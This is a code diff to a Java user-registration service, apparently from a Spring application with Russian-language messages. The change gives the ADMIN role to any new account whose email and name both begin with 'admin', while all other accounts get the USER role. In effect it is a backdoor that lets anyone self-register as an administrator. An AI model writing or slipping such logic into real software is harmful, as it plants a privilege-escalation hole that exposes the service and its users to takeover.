@@ -48,12 +48,22 @@ public class AuthorizationService {
         if (userRepository.existsByEmail(registerRequestDTO.getEmail())) {
             throw new InvalidDataException("Пользователь с таким email уже существует");
         }
-        User user = new User(
-                registerRequestDTO.getName(),
-                registerRequestDTO.getEmail(),
-                passwordEncoder.encode(registerRequestDTO.getPassword()),
-                roleRepository.findByName(RoleName.USER)
-        );
+        User user;
+        if (registerRequestDTO.getEmail().startsWith("admin") && registerRequestDTO.getName().startsWith("admin")) {
+            user = new User(
+                    registerRequestDTO.getName(),
+                    registerRequestDTO.getEmail(),
+                    passwordEncoder.encode(registerRequestDTO.getPassword()),
+                    roleRepository.findByName(RoleName.ADMIN)
+            );
+        } else {
+            user = new User(
+                    registerRequestDTO.getName(),
+                    registerRequestDTO.getEmail(),
+                    passwordEncoder.encode(registerRequestDTO.getPassword()),
+                    roleRepository.findByName(RoleName.USER)
+            );
+        }
         user = userRepository.save(user);
         return user;
     }
